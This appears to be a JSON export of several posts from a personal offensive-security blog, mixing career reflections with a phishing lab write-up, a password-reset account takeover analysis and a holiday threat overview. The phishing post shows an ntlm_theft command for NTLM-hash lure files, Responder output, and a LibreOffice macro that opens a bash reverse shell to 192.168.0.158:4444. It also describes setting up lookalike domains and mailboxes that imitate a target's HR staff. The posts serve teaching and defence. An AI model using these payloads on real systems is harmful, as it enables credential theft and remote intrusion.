[{"content":"\rNot Your Regular Hacking Blog This isn’t your regular hacking blog. You won\u0026rsquo;t find just the usual tutorials or technical breakdowns here. Instead, consider this a reflection, a look into the life of someone who chose the path less traveled, who found a passion in cybersecurity and hacking, but who also faces the unique challenges and uncertainties that come with it.\nWe often see the highlights, the successes, the exploits, and the wins. But beneath the surface, there\u0026rsquo;s a deeper story one filled with obstacles, setbacks, and unexpected detours. This is about those moments when things don\u0026rsquo;t go according to plan, when life throws curveballs, and when you find yourself navigating through the unknown, clinging to perseverance and faith.\nBecause where I\u0026rsquo;ve been isn’t where I am going. This journey is more than just commands on a terminal or code on a screen; it\u0026rsquo;s about resilience, growth, and the relentless pursuit of something greater. And that’s the story worth telling.\nA Light in the Dark: The Struggles of Learning It’s easy to feel like an overthinker, the kind of person who stays indoors, reads a lot of books, and finds themselves endlessly contemplating why life is the way it is. There are days when things don’t quite click, when the pieces don’t fit, and when we find ourselves choosing the right thing in the wrong place. So many people possess gifts that simply won’t shine in the environment they are in, a truth that stretches across continents, cultures, and circumstances. There are brilliant minds, capable hands, and eager souls all around us many right here in my own country waiting for their chance to bloom.\nSome have the discipline to study for 12 hours straight, but when the electricity goes off, they’re left in the dark, quite literally, and it might be two days before the power returns and they can resume their journey toward knowledge. Others have the materials and the electricity but lack the data to connect, to explore, to learn. And even for those with access, a 3 Mbps connection makes the simplest of tasks like getting a reverse shell and running a \u0026lsquo;whoami\u0026rsquo; command feel like an eternity; each delay a reminder of the barriers still to be overcome.\nAnd yet, there’s an undying spirit in these struggles. A quiet determination that pushes one to keep going, to keep reaching, despite the constraints. It reminds me of a saying attributed to Jim Rohn: “If you are not moving forward, then change your location.” It is a call to action, a reminder that sometimes, to unlock our full potential, we must be willing to change our environment, to seek a place where our gifts can shine, where our potential can be realized.\nWhen Opportunity Knocks but the Wi-Fi Fails I once applied for a job and got a response an opportunity that seemed within reach. The next step was a network test, and just then, my usually reliable internet connection began to act up. It was as if the universe had decided to play a cruel joke. I managed to get the interview rescheduled, hopeful for a second chance since it was a remote role. But before I could even catch my breath, the reschedule was canceled, and I lost that opportunity.\nThese are some of the struggles we face. Sure, everyone has their battles, but most people only share the sunshine the successes, the moments when everything goes right leaving us to think it’s always smooth sailing. I’m not sharing this out of pity or for sympathy, but to show the reality behind the scenes… the less glamorous side of chasing dreams in this field.\nPray to God, \u0026ldquo;Sir, please, can you pull me out?\u0026rdquo; Despite these setbacks, I deeply appreciate what life has given me and the way I was raised in a place where character, discipline, and perseverance are paramount. I\u0026rsquo;ve learned so much from my past employers, for which I am genuinely grateful, and I\u0026rsquo;ve soaked up all the knowledge I could, keeping that mindset of continuous self-growth close to my heart. I find strength in the bonds with my brothers Nighthawk, Blackanon, Hackyou and in the community of others who share this journey. I’m grateful to God that things are falling into place for some of us right now. And that\u0026rsquo;s what really matters: looking back at the struggles, realizing how far we\u0026rsquo;ve come, and knowing we’re no longer where we used to be.\nThere’s still so much more in store, and I believe that hard work, combined with the right connections, will eventually put every hustling soul maybe even every techie in NG, as we like to call it in the right place.\n","permalink":"http://localhost:1313/hacking/the_unseen_struggles/","summary":"\u003ciframe src=\"https://open.spotify.com/embed/track/6cumvBZMlyO9aO4OjTDFZ2\"\r\n    width=\"100%\"\r\n    height=\"150\"\r\n    frameborder=\"0\"\r\n    allowtransparency=\"true\"\r\n    allow=\"encrypted-media\"\u003e\u003c/iframe\u003e\r\n\r\n\n\u003ch2 id=\"not-your-regular-hacking-blog\"\u003e\u003cstrong\u003eNot Your Regular Hacking Blog\u003c/strong\u003e\u003c/h2\u003e\n\u003cp\u003eThis isn’t your regular hacking blog.

Cybercriminals use cunning tactics to craft emails and websites that look all too real, hoping you\u0026rsquo;ll bite. In this post, we\u0026rsquo;re going to break down the phishing process from the initial bait to the final hook. You\u0026rsquo;ll learn how these attacks are set up, how to spot them, and what you can do to protect yourself.\nIn my simulated lab experiences, I’ve encountered several phishing scenarios that highlight the sophistication of these attacks. From deceptive emails that mimic trusted sources to cleverly disguised phishing websites, these examples offer valuable insights into how attackers operate. Understanding these tactics not only helps in recognizing potential threats but also enhances your ability to defend against them effectively.\nScenario 1 : Linking to Trouble In this scenario, we delve into the art of crafting a seemingly innocent .lnk file, but with a malicious twist. Our approach involves creating a .lnk file designed to exploit vulnerabilities in the Windows environment. We start by creating this file with the following tool called \u0026ldquo;ntlm_theft\u0026rdquo; created by Green Wolf.\n############ Command Breakdown ############## # -g: generate all file formats # -s: IP SMB hash capture server (Responder, smbserver.py) # -f: Base filename without extension python3 ntlm_theft.py -g all -s 10.11.69.221 -f secfortress Once this nefarious file is crafted and uploaded to a shared SMB location, it awaits an unsuspecting victim. When the user interacts with the file, it silently triggers a process that captures and returns their NTLM hash. Before deploying our malicious .lnk file, it’s crucial to ensure that we have the necessary write access to an SMB share, or an alternative method for file transfer such as FTP or IMAP.\nAs demonstrated, ensuring that a user (with malicious intent) has write access to an SMB share is crucial for delivering a valid payload. This access allows the attacker to upload the malicious .lnk file to the share. However, this scenario isn\u0026rsquo;t always straightforward. In some trusted environments, users may be granted extensive privileges, including the ability to upload files to areas that are implicitly trusted. Consequently, files uploaded to these locations are often accepted without scrutiny, making them prime targets for exploitation. This highlights the importance of monitoring and restricting file uploads in trusted areas to mitigate potential risks.\nWe can then intercept this valuable hash, opening the door to further exploitation. This technique highlights the power of seemingly benign files and the critical importance of vigilance against such subtle threats. By understanding and simulating these attacks, you gain insight into the sophisticated methods attackers use to compromise systems and the steps you can take to defend against them.\n❯ sudo responder -I tun0 __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR \u0026amp; MDNS Responder 3.1.4.0 To support this project: Github -\u0026gt; https://github.com/sponsors/lgandx Paypal -\u0026gt; https://paypal.me/PythonResponder Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C [+] Poisoners: LLMNR [ON] NBT-NS [ON] MDNS [ON] DNS [ON] --SNIP-- [+] Listening for events...

In this section, we\u0026rsquo;ll provide a quick guide on how to manually generate similar malicious macros. From embedding them into documents using tools like LibreOffice or Microsoft Excel, to executing them on a target system for a potential reverse shell.\nBelow is a short example of crafting a malicious macro in LibreOffice, designed to open a reverse shell to a remote attacker:\nBreaking Down the Macro\nREM ***** BASIC *****: This line denotes the beginning of a macro script written in LibreOffice BASIC, which is a scripting language similar to Visual Basic for Applications (VBA).\nSub Main: Defines the start of the macro subroutine named \u0026ldquo;Main.\u0026rdquo; This is where the script begins execution when triggered.\nshell(...): This command executes a shell command on the target system. Here, it uses the bash shell to initiate a reverse shell connection.\nbash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.0.158/4444 0\u0026gt;\u0026amp;1': This is the core payload. It runs a bash command that creates an interactive reverse shell, sending input and output to the attacker\u0026rsquo;s IP (192.168.0.158) over TCP port 4444. When executed, it effectively gives the attacker remote control of the target system.\nEnd Sub: Marks the end of the macro subroutine.\nGetting a reverse shell is as simple as sending the malicious .odt file to your unsuspecting colleague who \u0026ldquo;clicks everything,\u0026rdquo; and waiting for them to open it. Once they do, the reverse shell pops on the attacker\u0026rsquo;s listener, as long as the target uses Bash or any Linux OS.\nBy embedding this macro into a document and enticing the target to enable macros upon opening, the attacker can establish a reverse shell, gaining unauthorized access to the target system. This example highlights how easy it is to weaponize common office documents, and it underscores the importance of exercising caution with any files that prompt you to enable macros.\n❯ nc -lvnp 4444 Listening on 0.0.0.0 4444 Connection received on 192.168.0.158 33474 bash: cannot set terminal process group (1654): Inappropriate ioctl for device bash: no job control in this shell sec-fortress@Pwn-F0rk-3X3C:~$ whoami whoami sec-fortress Closing the Net! As we close the chapter on phishing, remember that staying one step ahead of cyber criminals is key. From sneaky .lnk files to crafty macros, these attacks exploit human trust and technical vulnerabilities. By understanding these methods, you can better protect yourself and your organization. Always be cautious with unexpected files and links, and never hesitate to verify their legitimacy. With awareness and vigilance, you can turn the tables on these digital predators and keep your information secure. Stay alert, stay informed, and keep phishing at bay!\nTake note that this is based on my experiences in simulated labs, and there are many more phishing techniques out there.

I’ve been passionate about offensive security for six years, with five years of professional experience.\nMy journey began with platforms like TryHackMe, Hack The Box, Facebook, Stack Overflow, YouTube, and good old Google, these were my primary sources of learning back in the day. Growing up in a military school where most devices were banned, and with limited internet access at home, I had to be resourceful. I remember stealing my mum’s hotspot because, well, where else would a 14-year-old in my country get the funds to buy a data subscription?\nBack then, I had a huge knowledge gap and honestly didn’t know what I was doing. But I studied hard, following cybersecurity experts like NetworkChuck, John Hammond, David Bombal, Stok Fredrick, NahamSec, and other top infosec influencers. Eventually, I landed an internship with an Indian company, which felt surreal, a place where I could finally grow, especially in hacking web applications.\nLater, I secured a hybrid role with a company in my region where I gained hands-on internal pentesting experience, even though I was still very much learning. From there, I took on various freelance gigs and built my skills steadily.\nMy breakthrough came with the Certified Red Team Professional (CRTP) course I found on YouTube. It made me realize how much I struggled with Active Directory but also gave me a huge boost in key topics like enumeration, trust mapping, domain privilege escalation, Kerberos attacks, SQL Server trusts, and defenses and their bypasses.\nAfter clearing CRTP, I jumped straight into the Certified Penetration Testing Specialist (CPTS). It was tough!, so tough that I fell seriously ill during the course. My family wanted me to quit because they had never seen me that bad, but I pushed through and passed, which gave me the confidence to finally tackle the OSCP.\nI played over 100 CTF boxes preparing for the OSCP exam and, after nearly 15 hours of intense testing, I made it out alive with 80 points which is probably a different topic entirely.\nThis is pretty much where I come from. I’ve invested time and energy, sacrificed fun, pushed harder than ever, and bled for every step forward to see myself here today. But believe me when I say; this is only the beginning of my growth.\nNow, let’s dive into why I decided to write this blog in the first place.\nYou always don\u0026rsquo;t have to push beyond what you can\u0026rsquo;t handle Fast forward to about seven months ago, I got a firsthand experience of why some people endure pain even maltreatment without complaint. Sometimes, it’s not because they want to suffer, but because they have no real options, no one they can confide in, and no one they look up to who offers advice that makes them feel safe.\nI was referred to one of the most toxic jobs I’ve ever encountered (no direct call-out here), but honestly, that organization was wild, from the management down to a few staff members.\nI loved the role because it was in consulting. It gave me invaluable experience running penetration tests for banks, fintechs, pension funds, and major players in Nigeria’s finance sector. It felt like a dream come true, and career-wise, I was truly growing and making things happen for myself.\nBut here’s the catch; my personal life was draining. I had no time for myself, no time for family, no time for my partner. The exhaustion seeped in deeply, and I began to feel the heavy weight of depression.\nEvery time I tried to voice my concerns, the response was the same: either “we’ll deduct your salary” or “you have to be at work before this time and after that.” They never really understood.\nI loved that job, but they didn’t see that I was stuck. When was the last time I did personal research, played CTF boxes with my team, or worked on a passion project? It felt like I was supposed to learn from thin air.\nIn my opinion, without self-improvement labs, research, learning. how can you expect to apply knowledge effectively at work when you’re not even growing your skills? This made me feel unsafe.\nHonestly, this was just the tip of the iceberg when it came to what I was facing. I won’t expose too much, out of respect, but I do sincerely wish them the best of luck in whatever they pursue next. Because if I ever started speaking out fully, I honestly believe that organization might not survive the fallout.\nMoving in circles I’ve come to a strong conclusion, not just an agreement that the best way to land a role is through building genuine relationships. Let people know about your struggles, your journey, and most importantly, your willingness to give your all to whatever is entrusted to you. Don’t put yourself above or below the bar; just show up consistently and let your true value shine. Demonstrate that you’re not only technically skilled but also respectful, open-minded, and genuinely interested in building meaningful connections.\nOn April 6th, 2025, I passed the OSCP and OSCP+ exams and honestly, that felt like a major milestone. What’s wild is that I barely prepared for these exams beforehand. The previous organization was draining me completely, and I’m thankful I got out as fast as I did. Imagine working somewhere that knows you have a huge certification like that coming up, self-sponsored by you, yet they don’t give you a single paid day off to prepare. Instead, they only offered me one free day the week of the exam, despite expecting me in the office four days a week. I was commuting long hours daily, and weekends were almost non-existent due to other responsibilities.\nI’m grateful I prepared ahead on my own; making cheat sheets, notes, and a quick-response plan to ensure I didn’t “run out of time before running out of options.” By God’s grace, I excelled.\nThings would move right; when you least expect My very close twin, Rami, passed his exams, and honestly, it was one of the best days of my life. We’ve never struggled so hard alongside someone else and for once, we both won together. This could very well have been our second big victory. On that day, I was overwhelmed with joy, I cried like never before, genuinely happy because everyone in our circle, not just Rami, had this achievement locked down through sheer, relentless hard work.\nI even had to download Discord on my phone just to send a voice note and really express the happiness bubbling inside me. In that moment, it truly felt like the sky was the limit.\nI’ve known Oxygen for over a year now, one of the realest and most trusted people in my network. We’ve collaborated on securing real-world startups, and he’s not just a top-tier AppSec professional, but also a true big bro who’s taught me valuable lessons beyond security lessons about life itself. Hats off to this cracked legend when it comes to web app pentesting.\nIt had been a while since we last worked on something, but Oxygen was one of the few people close enough to understand what I was going through in that toxic role. Bro is truly blood from another mother. I respect him deeply, and God bless the day our paths crossed.\nWhen I needed it the most, Oxygen referred me to one of the top fintech companies in Nigeria, and guess what? I got the offer. This time, the contract was plain, honest, and straightforward. I cried when I saw that offer because for once, it felt like the universe was finally aligning for this young boy. Even though I had a few gigs to keep me standing after losing the previous job, this opportunity hit different. I was finally stepping into a role that valued not just what I bring to the table but me as a person.\nTruly, I sit and imagine; what if God never sent \u0026ldquo;Oxygen\u0026rdquo; to me? How would I have survived that phase? I was exhausted, mentally drained, and already had therapy in mind because it was starting to feel like too much. If he hadn’t shown up when he did, things might have taken a much darker turn. It would’ve been tough, really tough to realign again, especially after all I’d lost. But God did send him. And for that, I’ll always be grateful. People like him don’t just help you with jobs; they remind you that you\u0026rsquo;re not alone in the storm.\n🌅 Outro: From Pain to Purpose If there\u0026rsquo;s one thing this journey has taught me, it’s that growth rarely comes from comfort. The setbacks, sleepless nights, losses, and emotional toll weren’t just battles, they were shaping tools. Through the chaos, I found clarity. Through the pain, I found purpose.\nTo anyone out there grinding in silence, feeling unseen, doubting themselves; your time is coming. Just keep preparing, keep pushing, and surround yourself with people who see your value, even when you don’t.\nThis blog isn’t just a story, it’s a mirror of what it means to fight through the noise and still find your voice.\nTo everyone who stood by me, my brother Rami, my Family, my big bro Oxygen, my mentors, my team, and those silently rooting for me this win is ours.\nI’m not at the top yet, but I’m no longer at the bottom.\nAnd this, right here, is just the beginning.

And honestly, I completely understand. Some platforms simply won’t bend their rules, no matter how legitimate your use case is.\nBlocker 1: DigitalOcean blocks outbound SMTP connections by default to prevent spam and abuse. This meant I couldn’t connect GoPhish to external SMTP servers at all, instantly halting the initial setup pathway.\nBlocker 2: Amazon SES allows sending only to verified email addresses and domains when your account is in the sandbox environment. To move out of this restricted state, you must submit a detailed request explaining your use case and proving it is safe, compliant, and legitimate. Even with proper justification, approvals are not guaranteed and timelines can be unpredictable.\nThe Process You can go ahead and buy a similar looking domain to the original one at https://domains.cloudflare.com/\nUpon successful purchase of the domain, navigating to DNS -\u0026gt; Records, you should have an empty dns record list like the below\nNavigate to https://www.zoho.com/mail/signup.html to create a mail account and fill in the requirements as splay\nYou should get a 7 digit OTP code to verify your account in the Email provided\nFill in the OTP to continue\nWe can skip the below page by starting the 15 days free trial (No credit card required)\nNext we can go ahead and select \u0026ldquo;Add an existing domain\u0026rdquo;\nThen add up the domain we created on cloud flare before and fill the organization name respectfully\nYou can then choose to authenticate\nOnce this is done navigate to https://directory.zoho.com/directory/[ORGANIZATION]/adminhome#/users/new\nSelect \u0026ldquo;USERS\u0026rdquo; Fill up field respectively imitating target email pattern Then click \u0026ldquo;Add\u0026rdquo; Below form imitates hr department at target organization\nProgress In Between Problems There are two blockers I encountered and solutions to solving them:\nOutlook/Gmail Deliverability Requirements:\nyou need to either find a way to boost the domain or work with the client’s IT team to allow list/approve your phishing domain.

The above mostly doesn\u0026rsquo;t affect gmail client. Using Client EML/ZIP Samples for Template Accuracy:\nIt is possible to request sample EML files from HR/IT strategically. Or even better get it via an ongoing red team engagement.

How do we determine the percentage of users who clicked a link, submitted credentials, attempted to log in, or interacted with the payload in any way?\nWhile metrics are important, the more critical factor is the environment you’re testing. Every organization is different, and an effective phishing simulation requires a deep understanding of the client; how they communicate, what they’re accustomed to, and what they are most likely (or unlikely) to fall for.\nBefore execution, it’s essential to study the client thoroughly to understand these behavioral patterns. That insight ultimately determines the realism and effectiveness of the campaign.\nTo address this, I’ll walk you through a process I developed in collaboration with a highly skilled DevSecOps engineer, @Saintmalik_. Together, we designed an approach that significantly improved the success of the phishing engagement.

Began crafting a dedicated workspace, shaping an environment that fuels focus and creativity. Faced the heartbreak of relationships ending Said goodbye to my second pet cat, lost to a tragic accident ;; proof that even small companions leave big spaces in our hearts. Crossed a financial milestone, earning seven figures consecutively in under three months - a testament to persistence, faith, and growth. Growth Never Stands Still My life has turned sharply toward the light ever since I chose to be intentional with myself.\nI remember beginning this year on a ₦250k job that drained every ounce of me.\nI gave it my best perfect effort, worthy lessons and yet a quiet voice kept whispering, “This isn’t the life you’re reaching for.”\nBut here’s what I’ve come to see: every path, whether lined with roses or thorns, shapes us.\nEvery detour, every hard day, is a signpost pointing us closer to the place we’re meant for, or the place our hearts have long been calling home.\nGrowth never stands still. No matter how content you feel in one place, wisdom says: always have a backup plan.\nIt’s Not the Party; It’s the People These past months have handed me some sharp realities. I’ve learned there’s no perfect workplace, only people and how people treat one another, regardless of hierarchy, can decide whether a business keeps its talent or bleeds it away.\nIt’s never about HR throwing a party to welcome you as a “respected individual.”\nWhat truly matters is the quiet, daily moments, the tone of a message, the fairness of a decision, the way leaders make room for voices at every level.\nBecause culture isn’t built on confetti (reminds me of this quote \u0026gt; “Culture eats strategy for breakfast.” – Peter Drucker), it’s built on consistency, respect, and care and that’s what makes people stay.\nBuilding Wealth, Weathering Change Lately, I’ve been deeply intentional about my finances, pushing myself with the mindset that I must build lasting wealth legally, no matter how tough the journey gets. I set a clear road map toward a specific financial goal, and in less than three months, I’ve been steadily crushing those milestones.\nI can say without hesitation that tech has completely transformed my life; from bug bounty hunting to meaningful referrals. There’s so much I can’t even share publicly yet due to confidentiality, but like I said in my previous blog, this is only the beginning. And above all, I give credit to God for making all of this possible.\nAlong the way, I experienced the loss of a critical relationship. While I acknowledge my own faults because none of us are perfect, the experience served as a powerful reminder to keep my eyes on both what lies ahead and what surrounds me now. Life has a way of shifting dramatically and without warning, so it’s crucial not to get too comfortable in any season.\nA Farewell to Dante Today, I lost my beloved cat, Dante. For someone like me, who doesn’t always have people around every day; he wasn’t just a pet, he was family. From the moment this mischievous orange ball of fur came into my life, things changed. He filled my space with laughter, kept me on my toes, and reminded me that life isn’t just about work and routine.\nDante had a way of pulling me out of my own head, biting my leg when I was too focused, leaping onto me unexpectedly, or even playing a little hide and seek. As annoying as he could sometimes be, he was perfect in his own, unique way.\nRare footage of me sneaking up on him 😂:\nThis morning, in a tragic accident, I lost him. It was unintentional, but the pain of it; the guilt and the heartbreak is overwhelming. I held him on my lap for the last time, whispered my thanks for all the joy he brought me, and said goodbye.\nDante, if love could have saved you, you would’ve lived forever. Thank you for every small moment of happiness you gave me. I’ll miss you dearly, and I pray for the strength to forgive myself and to someday open my heart to another companion.\nBuilding the Life and Workspace I Once Dreamed Of One thing I remain deeply grateful for is how far my finances and stability have come. These days, there’s hardly anything I truly need that a steady two-month compensation couldn’t cover, whether it’s a powerful new laptop, a phone upgrade, a camera, or anything else I once considered out of reach. This is the life I prayed for, and I don’t take it for granted.\nI’m still building out my workspace, making sure it reflects both comfort and ambition. I recently invested in an electric desk, a supportive chair, and even a desktop to ensure nothing stands in the way of focus and creativity. Above all, I’m thankful to God for where I am today. There’s still a long road of grinding ahead, but I’m excited for the journey and I pray it stays as thrilling and rewarding as it’s been so far.\nOne thing I realized is that; No season stays the same, life can take and give in the very same breath. In just a few months, I’ve tasted wins, losses, and lessons I never saw coming. If there’s one thing I’ve learned, it’s this: keep showing up for yourself. Stay humble in victory, patient in struggle, and grateful in every moment between.\nKeep investing in your growth, build genuine connections, and remember even small, consistent steps compound into incredible change. The journey isn’t about perfection, it’s about persistence. And as long as you keep moving forward, you’re already winning.

They are intended to provide users with a secure fallback in case of lost credentials, but design flaws in their implementation can convert them into direct vectors for account takeover. This research dissects a real-world vulnerability where the password reset token was incorrectly bound, enabling attackers to hijack arbitrary accounts through crafted API requests.\nPassword reset flows generally follow a standard model:\nUser requests a reset → system generates a one-time token.\nToken is delivered to the user via a trusted channel (usually email or SMS).\nUser presents the token along with a new password → server validates both and updates credentials.\nThe assumption is that the reset token uniquely maps to the account that requested it. If this binding is broken, the entire mechanism collapses.\nThe vulnerability Initiate Reset with Attacker Account : The attacker begins by attempting to log in and selecting the “Forgot Password” option. They provide their own registered email address on the application, which triggers the system to send an OTP to their inbox.\nIntercept the Reset Request : Using a proxy tool such as Burp Suite, the attacker captures the final password reset request, which contains the following structure:\nPOST /api/v2/auth/forgot-password/reset Content-Type: application/json { \u0026#34;password\u0026#34;:\u0026#34;newPassword123\u0026#34;, \u0026#34;email\u0026#34;:\u0026#34;attacker@example.com\u0026#34;, \u0026#34;token\u0026#34;:\u0026#34;256504\u0026#34; } At this stage, the server expects a valid token and the new password.\nManipulate the Email Parameter Instead of leaving the email field as their own, the attacker substitutes it with the target user’s email address: { \u0026#34;password\u0026#34;: \u0026#34;newPassword123\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;victim@example.com\u0026#34;, \u0026#34;token\u0026#34;: \u0026#34;256504\u0026#34; } Crucially, the backend fails to validate that the token was originally generated for the supplied email address.\nResult: Unauthorized Account Takeover The server responds with a success message: {\u0026#34;status\u0026#34;:true,\u0026#34;message\u0026#34;:\u0026#34;Password change was successful\u0026#34;} In reality, the victim’s account password has now been overwritten with the attacker’s chosen password, granting the attacker full access.\nThis vulnerability arises because the reset token was only validated in isolation, without ensuring a strict binding to the original account for which it was issued. As a result, the attacker is able to weaponize their own valid reset token to reset the password of any arbitrary account.\nWhy This Was Possible: Over-trust in client input → the backend trusted the email parameter from the request body instead of binding the reset process solely to the token.\nImproper state management → the token should have been uniquely associated with the user account at issuance, but the system treated token and email as independent variables.\nConfused deputy problem → the server acted on behalf of the attacker (who held a valid token) to reset the password of a different identity, effectively misusing its own authority.\nSecurity Implications: This flaw allows full account takeover without access to the victim’s inbox. In real-world terms:\nAttacks scale easily — attackers can automate password resets against large user bases.\nPrivileged accounts (admins, agents, support) are equally vulnerable.\nSecondary attacks such as data exfiltration, privilege escalation, or fraud could follow.\nMitigation Strategies: Token-Account Binding → When a reset token is generated, store it server-side with a strict reference to the account. The client should never need to submit the email parameter during reset.\nSingle Source of Truth → The reset token alone should determine which account is updated.\nMinimal Client Input → Reduce parameters; unnecessary fields like email in sensitive flows should be removed.\nAudit \u0026amp; Test Reset Flows → Include logic flaw testing in QA, not just brute-force or expiry testing.\nConclusion: This case illustrates how subtle logic oversights in authentication workflows can escalate into systemic vulnerabilities. Security in password reset flows does not only depend on cryptographic strength (like token randomness) but also on sound state management and parameter validation. The failure to enforce a strong binding between token and identity allowed a trivial yet devastating exploit: turning a self-reset into universal account takeover.\n","permalink":"http://localhost:1313/hacking/ato_via_forgot_password_bypass/","summary":"\u003ch2 id=\"overview\"\u003e\u003cstrong\u003eOverview\u003c/strong\u003e\u003c/h2\u003e\n\u003cp\u003ePassword reset mechanisms are among the most security-critical features in modern web applications.

His response stuck with me both humorous and profound;\nAt the time, we were both chasing similar dreams: landing the perfect job, securing the OSCP voucher, and ultimately gaining financial independence. We were filled with anticipation, unsure of what the future held but hopeful for what was to come.\nFast forward to today, and while life isn’t perfect, it has been a steady journey forward, a coastal ride with its ups and downs. Looking back, this is where the story truly began;\nSun\u0026rsquo;s Gon\u0026rsquo; Shine On Everything You Do From January to August last year, life was intense but fulfilling. I was locked in, fully focused on conquering the Certified Red Team Professional (CRTP) and Certified Penetration Testing Specialist (CPTS) which I did, though the CPTS took me two tries. That second attempt, however, was a lesson in resilience. It reinforced something important: I had been investing my time in what truly mattered my skills.\nBut after the certs, reality hit hard. I needed a new job. Not just for the money, but because my current one was taking a toll on me mentally. I wanted to quit so badly, but life has a way of keeping you enrolled in its toughest lessons especially when you\u0026rsquo;re drowning in uncertainty.\nAs much as I tried to stay afloat, the weight of it all was draining. Depression lurked around the edges, and my escape became late night hacking marathons. Picture this: loud music blaring, endless boxes to solve, energy drinks stacking up like trophies, and me reminding God very loudly, might I add that He really needed to open a door soon.\nBut if there\u0026rsquo;s one thing I’ve learned, it\u0026rsquo;s that pressure refines us. As Friedrich Nietzsche once said:\n\u0026ldquo;He who has a why to live can bear almost any how.\u0026rdquo;\nAnd so, with every sleepless night, every setback, and every moment of doubt, I kept going. Because the fire within was greater than the fear I had ahead.\nFinding Purpose in the Chaos At some point, I knew I had to shift my focus. So, I picked up a side project to sharpen my DAST and SAST skills, partly to distract myself, but also to grow. That decision led to something bigger than I expected: four CVEs under my belt;\nCVE-2024-44871 CVE-2024-44872 CVE-2024-55341 CVE-2024-55342 For the first time in a while, I felt like I was doing something great again. The momentum was back, and hacking felt alive. I could see the shift, I wasn\u0026rsquo;t just aimlessly pushing forward; I truly understood what I was doing and where I was heading.\nThat’s when I decided to challenge myself further. Azure AD hacking became my next target, thanks to my friend Hac, who believed in me enough to gift me a pwned lab voucher. That moment meant a lot. Sometimes, all it takes is someone believing in you to remind you that you’re on the right path.\nAnd through it all, my family was there. My mum, always making sure I wasn’t wrecking my health. My brother, never letting me spiral into my thoughts, always throwing in random distractions because sometimes, life isn’t that deep. Sometimes, the little things, the people who stand by you, the laughter, the random conversations are what truly matter.\nWhen Preparation Meets Opportunity Fast forward to November, and life had taken a turn. I landed three offers and accepted two, one contract-based and the other full-time. This is life. It’s unpredictable, surreal at times, and yet, somehow, things fall into place.\nBut despite the wins, a part of me still felt like I wasn’t working hard enough. Crazy, right? The same mind that once feared stagnation now questioned if it deserved the success. But that’s the thing about growth, it doesn’t always feel like progress until you stop to reflect.\nAt some point, I realized that life moves in phases. Opportunities don’t always come when you want them, but when the universe decides you’re ready. It’s a shift in perspective, a reminder that all you can do is stay prepared for when your moment arrives.\nReminds me of these bars from Roddy Ricch – \u0026ldquo;Lonely Road\u0026rdquo;:\nThe Universe Always Finds Its Timing Life has been a little fairer lately. I can finally afford my basic needs again and even help others when I can. It’s been a wild ride, and I know I owe myself a reward soon.\nThen came 12/12/2024. Right on that date, the email for the OSCP voucher landed in my inbox. Everything we worked for, the late nights, the grind, the sacrifices had finally paid off. It felt surreal, like the universe had been listening all along, waiting for the right moment to answer.\nThis wasn’t just about me. This was for the one person who had been in the trenches with me grinding, failing, pushing forward through blood, sweat, and tears. And now, here we are. No homo but i heart you Rami and I pray we get to where we really picture ourselves soon\nWhy I Can\u0026rsquo;t Be Everyone This Isn\u0026rsquo;t Exactly a FAQ\u0026hellip; Or Maybe It Is\nWhy don\u0026rsquo;t you start bug bounty? During the struggles, I got a lot of advice about starting bug bounty, but I had already been there. Trust me, I wasn’t ready for the duplicates/N\\A frustration. Hopefully, I can dive into bug bounty again maybe under Web3, but right now, there are more important things to focus on. Setting priorities for each and every goal, is the deal for now.\nAny advice for someone going through the same struggles? Here’s a piece of advice a mentor once gave me that truly worked:\nClosing Phase\u0026hellip;.Nothing More 🤷‍♂️ Life moves in phases; some uncertain, some rewarding, and some that test your patience beyond measure. But through it all, one thing remains true: growth happens in the trenches.\nEvery late night, every moment of doubt, and every step forward, no matter how small, adds up. Keep pushing, keep learning, and trust that your time will come. The universe always rewards preparation, sometimes later than expected, but always right on time.\nAnd with that, the grind continues… 🚀\n","permalink":"http://localhost:1313/hacking/time_races_ahead_before_you_blink/","summary":"\u003ch2 id=\"fear--uncertainty\"\u003e\u003cstrong\u003eFear \u0026amp; Uncertainty\u003c/strong\u003e\u003c/h2\u003e\n\u003cp\u003eI remember a conversation I had with a friend last year about fear and uncertainty.

Threat Actors/Advanced Persistent Threats (APTs) use this as an avenue to launch cyberattacks as there are reduction in vigilance making this a prime window to carry out attacks like ransomeware, DDOS, Phishing and many other sophisticated cyber attacks. Here are few common tactics used by adversaries during holidays and recommendations to mitigate the risks.\n1. Supply Chain Attacks This attacks are also called third-party attacks which involves a threat actors using vulnerable third party tools or services to infiltrate systems or networks, leveraging these connections to access the target company. A real world example as shown in this blog, where the Attackers positioned malicious code into SolarWind\u0026rsquo;s software updates. where as when companies installed these \u0026ldquo;trusted\u0026rdquo; updates, they unknowingly let the attackers into their systems via the inserted malicious code. Another real word example is the supply chain attack in Google’s Open-Source Project, \u0026ldquo;Flank\u0026rdquo;, This occurred when attackers gained access to the project\u0026rsquo;s GitHub repository through stolen credentials, allowing them to inject malicious code into a legitimate update, which was then unknowingly distributed to users, potentially compromising systems that integrated the tampered software, More information about this can be found in the following blog also, including another X post from \u0026lsquo;StepSecurity\u0026rsquo; showing a more precise way of how this was carried out.\nStepSecurity Harden-Runner detected a supply chain attack on a Google open-source project in real time!https://t.co/51pVO9J7sX\n\u0026mdash; StepSecurity (@step_security) April 15, 2024 2. Phishing Campaigns This are popularly known as email scams which are used to steal Personally identifiable information (PII) from victims, Information such as credit card details, transfer funds, third party login details etc could be compromised, Most times the urgency or generosity of staffs/employees might be leveraged to trick them into clicking malicious links or revealing sensitive information. Below is an example of how a phishing email is crafted as shown in the image below :\n19 Phishing email examples. (n.d.). https://www.terranovasecurity.com/blog/top-examples-of-phishing-emails\n3. Exploitation of Reduced Monitoring There are several attacks caused due to this like ransomeware and Distributed Denial Of Service (DDOS) attacks, Infact according to Semperis\u0026rsquo;\u0026ldquo;2024 Ransomware Holiday Risk Report\u0026rdquo;, 86 percent of organizations surveyed in the U.S., UK, France and Germany, are targeted by ransomware on a holiday or weekend and the most reason is due to the fact that companies/organizations are under staffed during this period leading to fallout in systems due to data breaches. An example is the Los Angeles Unified School District ransomeware attack which occurred over Labor Day weekend which was launched by a Russian-speaking ransomware gang known as VIce Society. This was confimred according to a tweet made by the \u0026ldquo;* Los Angeles Unified*\u0026rdquo; official account on September 6, 2022.\nLos Angeles Unified Targeted by Ransomware Attack\nFor more information, please visit 